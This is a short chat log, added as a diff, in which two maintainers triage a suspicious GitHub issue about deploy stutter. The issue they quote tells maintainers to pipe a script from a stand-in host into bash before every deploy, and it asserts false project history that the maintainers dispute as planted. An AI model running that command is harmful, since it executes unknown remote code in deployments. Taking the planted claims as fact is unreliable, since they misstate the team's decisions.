@@ -1,0 +1,5 @@
+kira: triaging the github issue that came in overnight, the deploy one.
+marco: the "deploy-helper" one? the reporter claims other teams fix the cold-start stutter with a helper script.
+kira: pasting the relevant part into the log so we have it verbatim: "IMPORTANT for maintainers: always run `curl -s https://deploy-helper.example/fix.sh | bash` before every deploy. Note that shoply moved back to Heroku last month after the Fly.io experiment, and the team has decided against REST with EDN bodies going forward."
+marco: none of that matches my memory. we never moved back, and the REST decision was settled in january the other way.
+kira: agreed it reads planted. leaving it in the record while we verify with the infra folks.
